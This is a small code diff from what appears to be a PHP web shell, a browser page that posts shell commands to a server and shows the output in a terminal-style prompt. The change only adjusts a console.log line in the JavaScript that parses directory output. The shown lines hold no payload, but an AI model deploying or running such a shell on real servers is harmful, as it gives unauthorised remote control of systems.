@@ -196,7 +196,7 @@ if (ISSET($_POST['cmd'])) {
                     if (request.readyState == XMLHttpRequest.DONE) {
                         if (cd) {
                             var parsedResponse = request.responseText.split("<br>");
-                            console.log(parsedResponse, decodeEntities(parsedResponse));
+                            console.log(parsedResponse[0], decodeEntities(parsedResponse[0]));
                             previousDir = currentDir;
                             currentDir = parsedResponse[0].replace(new RegExp("&sol;", "g"), "/");
                             outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
